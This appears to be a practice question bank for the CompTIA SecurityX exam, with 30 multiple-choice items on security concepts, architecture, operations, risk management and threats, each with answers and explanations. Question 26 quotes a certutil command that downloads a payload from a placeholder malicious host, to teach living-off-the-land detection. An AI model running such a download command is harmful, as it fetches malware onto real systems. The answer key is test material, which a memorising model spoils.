<table width="100%">
  <tr>
    <td align="center" valign="middle" width="50%">
      <p align="center"><img src="https://pub-6a9f8dede1194a7786cba69e7dcdad9f.r2.dev/certifications/CompTIA/CompTIA%20SecurityX%20ce%20Certification" width="50%"></p>
    </td>
    <td align="center" valign="middle" width="50%">
      <h1>CompTIA SecurityX</h1>
    </td>
  </tr>
</table>

## 📑 Table of Contents

- [General Security Concepts](#general-security-concepts) (4 questions)
- [Security Architecture](#security-architecture) (5 questions)
- [Security Operations](#security-operations) (8 questions)
- [Security Program Management and Oversight](#security-program-management-and-oversight) (6 questions)
- [Threats, Vulnerabilities, and Mitigations](#threats-vulnerabilities-and-mitigations) (7 questions)

## 📋 Exam Information

| Field | Value |
|-------|-------|
| Total Questions | 30 |
| Level | Foundation |
| Exported At | 2026-08-24T21:51:53.743Z |
| Domains | 5 |

## 📊 Domain Distribution

| Domain | Questions |
|--------|-----------|
| General Security Concepts | 4 |
| Security Architecture | 5 |
| Security Operations | 8 |
| Security Program Management and Oversight | 6 |
| Threats, Vulnerabilities, and Mitigations | 7 |

---

### **General Security Concepts**

### 1. Which security principle ensures that users and processes are granted only the minimum permissions necessary to perform their tasks?

- [ ] **A)** Principle of least privilege
- [ ] **B)** Defense in depth
- [ ] **C)** Separation of duties
- [ ] **D)** Risk acceptance

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Least privilege limits permissions to the minimum required for assigned tasks, reducing the attack surface and limiting damage from compromised identities.
 
 
</details>

### 2. Which options accurately describe elements of a defense-in-depth security architecture within a modern enterprise environment?

- [ ] **A)** Multiple heterogeneous security layers
- [ ] **B)** Redundant firewalls from the same vendor
- [ ] **C)** Layered network, host, and application controls
- [ ] **D)** Implicit trust inside the network

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, C**
 
> 💡  **Explanation** 
> 
> Defense-in-depth uses diverse, layered controls so the failure of any one control does not lead to total compromise; single-vendor redundancy and implicit trust are insufficient.
 
 
</details>

### 3. Review the code block. Which fundamental security concept is illustrated by the access policy shown?

```json
{
  "effect": "allow",
  "action": ["read", "write"],
  "resource": "db:customer_records",
  "condition": { "time": "change-window" }
}
```

- [ ] **A)** Least privilege
- [ ] **B)** Cryptographic non-repudiation
- [ ] **C)** System availability
- [ ] **D)** Defense in depth

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The policy permits only needed actions on one resource during a change window, reflecting least privilege and just-in-time access.
 
 
</details>

### 4. In a Zero Trust architecture, which component evaluates access requests against enterprise policy and makes the decision to grant access?

- [ ] **A)** Policy Decision Point (PDP)
- [ ] **B)** Policy Enforcement Point (PEP)
- [ ] **C)** Policy Administrator (PA)
- [ ] **D)** Identity Provider (IdP)

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The PDP evaluates policy and contextual signals to decide whether access is granted, while the PEP enforces the decision.
 
 
</details>


---

### **Security Architecture**

### 5. Which statement best defines network segmentation?

- [ ] **A)** Dividing infrastructure into smaller isolated domains
- [ ] **B)** Applying software-defined boundaries to workloads
- [ ] **C)** Replacing firewalls with identity-based access
- [ ] **D)** Encrypting all traffic with mutual TLS

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Network segmentation divides a broad IT infrastructure into smaller, isolated domains using VLANs, subnets, and firewalls to restrict lateral movement.
 
 
</details>

### 6. Which two technologies are commonly associated with Layer 2 segmentation? (Select all that apply.)

- [ ] **A)** VLANs
- [ ] **B)** VXLAN
- [ ] **C)** Next-Generation Firewall (NGFW)
- [ ] **D)** Trusted Platform Module (TPM)

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B**
 
> 💡  **Explanation** 
> 
> VLANs segment Layer 2 networks with physical switches, while VXLAN encapsulates Layer 2 frames in Layer 4 UDP packets for virtualization.
 
 
</details>

### 7. Review the provided network configuration. What type of segmentation does it describe?

```yaml
segments:
  - name: web
    type: VLAN
  - name: app
    type: VLAN
  - name: db
    type: VLAN
```

- [ ] **A)** Layer 2 VLAN segmentation
- [ ] **B)** Workload micro-segmentation
- [ ] **C)** Software-defined perimeter
- [ ] **D)** Hypervisor-level filtering

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The code defines VLANs, which operate at Layer 2 for broad macro-segmentation rather than workload-level micro-segmentation.
 
 
</details>

### 8. What does East-West traffic refer to in a data center?

- [ ] **A)** Traffic moving laterally within the internal network
- [ ] **B)** Traffic flowing between the data center and external networks
- [ ] **C)** Traffic generated by cloud service providers
- [ ] **D)** Traffic between management interfaces only

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> East-West traffic moves laterally within the internal network, while North-South traffic flows between the data center and external networks.
 
 
</details>

### 9. Which principles are enforced by micro-segmentation in a Zero Trust Architecture? (Select all that apply.)

- [ ] **A)** Least-privilege access to authorized segments
- [ ] **B)** Continuous verification of sessions
- [ ] **C)** Implicit trust after authentication
- [ ] **D)** Access based only on physical switch ports

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B**
 
> 💡  **Explanation** 
> 
> ZTA mandates continuous verification, and micro-segmentation enforces least-privilege access only to authorized micro-segments.
 
 
</details>


---

### **Security Operations**

### 10. What does the incident response lifecycle represent in the SecurityX framework?

- [ ] **A)** Strategic framework for detection, containment, eradication, and recovery
- [ ] **B)** Tier-one SOC ticket triage process
- [ ] **C)** Compliance report of final findings
- [ ] **D)** Manual antivirus signature updates

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The SecurityX lifecycle is an enterprise-wide strategic framework covering detection, containment, eradication, and post-incident recovery, not just triage or reporting.
 
 
</details>

### 11. Which activities are included in the SecurityX incident response lifecycle? (Select all that apply.)

- [ ] **A)** Precision containment to halt lateral movement
- [ ] **B)** Forensic preservation and chain of custody
- [ ] **C)** Cold log archival for one year
- [ ] **D)** Continuous improvement from root cause analysis

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B, D**
 
> 💡  **Explanation** 
> 
> Precision containment, forensic preservation, and post-incident improvement are explicit lifecycle components; cold log archival is not listed as a lifecycle phase.
 
 
</details>

### 12. What incident response phase is performed by the actions in the code block?

```python
for pod in compromised_pods:
    apply_network_policy(pod, deny_egress=True)
    capture_memory(pod)
    revoke_service_account_tokens(pod)
```

- [ ] **A)** Containment and forensic preservation
- [ ] **B)** Eradication and system hardening
- [ ] **C)** Post-incident continuous improvement
- [ ] **D)** Threat intelligence aggregation

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The actions isolate affected pods while preserving memory and revoking credentials, balancing containment with forensic integrity.
 
 
</details>

### 13. What is the main purpose of SOAR in enterprise security operations?

- [ ] **A)** Coordinating tools and automating response workflows
- [ ] **B)** Replacing security analysts entirely
- [ ] **C)** Storing logs for compliance audits
- [ ] **D)** Generating weekly executive reports

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> SOAR orchestrates multi-tool workflows, automates response actions, reduces MTTC, and supports analyst efforts rather than replacing them.
 
 
</details>

### 14. Which capabilities are part of advanced SIEM and UEBA integration in enterprise monitoring? (Select all that apply.)

- [ ] **A)** Machine learning baseline profiling
- [ ] **B)** High-fidelity telemetry correlation
- [ ] **C)** Passive alert triage with default rules
- [ ] **D)** Threat intelligence feed enrichment

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B, D**
 
> 💡  **Explanation** 
> 
> UEBA, normalized telemetry for correlation, and threat intelligence enrichment are advanced SIEM capabilities; passive triage is the opposite.
 
 
</details>

### 15. Which security activity is shown in the code block?

```python
hypotheses = load_threat_intel_reports()
for endpoint in endpoints:
    if baseline_deviation(endpoint):
        escalate(endpoint)
```

- [ ] **A)** Hypothesis-driven threat hunting
- [ ] **B)** Compliance-based log retention
- [ ] **C)** Signature-based malware scanning
- [ ] **D)** Annual disaster recovery testing

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The workflow loads intel-driven hypotheses and investigates baseline deviations, which is core hypothesis-driven threat hunting.
 
 
</details>

### 16. What does the order of volatility require in digital forensics?

- [ ] **A)** Capture volatile memory before non-volatile storage
- [ ] **B)** Image the hard drive before RAM
- [ ] **C)** Delete volatile data first
- [ ] **D)** Capture network traffic after disk imaging

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Order of volatility prioritizes ephemeral data like RAM before non-volatile media to avoid losing critical artifacts.
 
 
</details>

### 17. Which practices help preserve forensic evidence integrity? (Select all that apply.)

- [ ] **A)** Generate cryptographic hashes after acquisition
- [ ] **B)** Document chain of custody
- [ ] **C)** Reboot system before imaging
- [ ] **D)** Use unverified tools that alter metadata

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B**
 
> 💡  **Explanation** 
> 
> Hashing and chain-of-custody documentation preserve integrity; rebooting can destroy volatile evidence, and unverified tools can alter artifacts.
 
 
</details>


---

### **Security Program Management and Oversight**

### 18. Which statement best defines risk assessment in enterprise security governance?

- [ ] **A)** Identifying, analyzing, and evaluating threats and vulnerabilities against critical business assets and strategic objectives
- [ ] **B)** Installing security tools to eliminate all identified threats
- [ ] **C)** Purchasing cyber insurance to transfer potential losses
- [ ] **D)** Documenting only compliance requirements for annual audits

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Risk assessment is the structured process of identifying, analyzing, and evaluating threats and vulnerabilities in the context of business assets and objectives.
 
 
</details>

### 19. Which of the following are recognized risk treatment strategies in the Four Ts model? (Select all that apply.)

- [ ] **A)** Treat/Mitigate
- [ ] **B)** Transfer
- [ ] **C)** Tolerate/Accept
- [ ] **D)** Defer/Postpone

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B, C**
 
> 💡  **Explanation** 
> 
> The Four Ts are Treat/Mitigate, Transfer, Tolerate/Accept, and Terminate/Avoid. Defer/Postpone is not one of the recognized treatment strategies.
 
 
</details>

### 20. Review the risk register excerpt in the code block. Which essential element is missing from this entry?

```json
{
  "risk_id": "RSK-042",
  "threat_vector": "Phishing",
  "asset": "Corporate Credentials",
  "inherent_risk_score": 8,
  "treatment": "Mitigate",
  "residual_risk_score": 3,
  "owner": "CISO"
}
```

- [ ] **A)** Lifecycle status
- [ ] **B)** Risk owner
- [ ] **C)** Residual risk score
- [ ] **D)** Risk ID

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> A dynamic risk register must track lifecycle states such as open, in progress, or accepted. The entry is missing that lifecycle status.
 
 
</details>

### 21. What is meant by risk appetite in enterprise security?

- [ ] **A)** The broad level of risk the organization is willing to accept in pursuit of strategic goals
- [ ] **B)** The exact number of security incidents tolerated per month
- [ ] **C)** The total amount of cyber insurance coverage purchased
- [ ] **D)** The maximum time allowed to patch critical vulnerabilities

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Risk appetite represents the organization's overall willingness to accept risk while pursuing its strategic objectives.
 
 
</details>

### 22. Which of the following elements should be tracked in a risk register? (Select all that apply.)

- [ ] **A)** Risk owner
- [ ] **B)** Residual risk score
- [ ] **C)** Threat vector
- [ ] **D)** Employee performance rating

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B, C**
 
> 💡  **Explanation** 
> 
> Risk registers track risk IDs, threat vectors, inherent and residual scores, treatment plans, and risk owners. Employee performance data is unrelated.
 
 
</details>

### 23. Use the values in the code block to calculate the Annual Loss Expectancy (ALE).

```javascript
let sle = 2500;
let aro = 4;
let ale = sle * aro;
```

- [ ] **A)** $10,000
- [ ] **B)** $2,500
- [ ] **C)** $4,000
- [ ] **D)** $100,000

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> ALE is calculated as SLE × ARO. With SLE of $2,500 and ARO of 4, the ALE is $10,000.
 
 
</details>


---

### **Threats, Vulnerabilities, and Mitigations**

### 24. Which term describes a prolonged, stealthy campaign conducted by a persistent adversary to achieve strategic objectives?

- [ ] **A)** Advanced persistent threat
- [ ] **B)** Script kiddie
- [ ] **C)** Hacktivist
- [ ] **D)** Insider threat

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> An advanced persistent threat is a prolonged campaign by a sophisticated adversary focused on strategic goals, using stealth and persistence to avoid detection.
 
 
</details>

### 25. Which characteristics are commonly associated with advanced persistent threat actors operating in complex enterprise environments? (Select all that apply.)

- [ ] **A)** Geopolitical or strategic motivations
- [ ] **B)** Custom toolsets and tradecraft
- [ ] **C)** Opportunistic single-stage attacks
- [ ] **D)** Long-term stealth and persistence

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B, D**
 
> 💡  **Explanation** 
> 
> APTs typically have strategic motivations, custom tools, and operate stealthily for long periods, unlike opportunistic attackers seeking quick financial gain.
 
 
</details>

### 26. Review the command shown in the provided code block. Which attack technique does it illustrate to the analyst?

```cmd
certutil -urlcache -split -f http://malicious.example.com/payload.exe C:/Windows/Temp/payload.exe
```

- [ ] **A)** Living off the Land
- [ ] **B)** SQL injection
- [ ] **C)** DLL sideloading
- [ ] **D)** Man-in-the-middle

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Using a trusted Windows binary like certutil to download and execute payloads is a living off the Land technique that evades signature-based defenses.
 
 
</details>

### 27. From the perspective of an external attacker, what does an unauthenticated vulnerability scan primarily reveal about a target network?

- [ ] **A)** Perimeter exposure and visible services
- [ ] **B)** Deep local misconfigurations
- [ ] **C)** Runtime application logic errors
- [ ] **D)** Source code quality flaws

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Unauthenticated scans simulate outsider visibility, identifying exposed services and perimeter weaknesses, while authenticated scans examine internal configuration details.
 
 
</details>

### 28. Which items are typically listed in a software bill of materials for modern enterprise applications? (Select all that apply.)

- [ ] **A)** Third-party libraries
- [ ] **B)** Open-source dependencies
- [ ] **C)** Employee payroll records
- [ ] **D)** Container base images

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B, D**
 
> 💡  **Explanation** 
> 
> An SBOM inventories software components such as libraries, dependencies, and base images, helping teams track known vulnerabilities and supply chain risk.
 
 
</details>

### 29. The Dockerfile excerpt in the code block represents a potential supply chain risk. Which control should be applied before deployment?

```dockerfile
FROM python:3.11-slim
COPY requirements.txt /app/
RUN pip install -r requirements.txt
```

- [ ] **A)** Container image scanning
- [ ] **B)** Network firewall rules
- [ ] **C)** Data loss prevention policy
- [ ] **D)** Physical access control

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Container image scanning checks base images and installed packages for known CVEs, protecting against vulnerable dependencies in the build pipeline.
 
 
</details>

### 30. Which security testing technique analyzes application source code for vulnerabilities without executing the application at runtime?

- [ ] **A)** Static application security testing
- [ ] **B)** Dynamic application security testing
- [ ] **C)** Runtime application self-protection
- [ ] **D)** Penetration testing

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> SAST analyzes source, bytecode, or binaries without execution, enabling early detection of structural vulnerabilities in the development lifecycle.
 
 
</details>
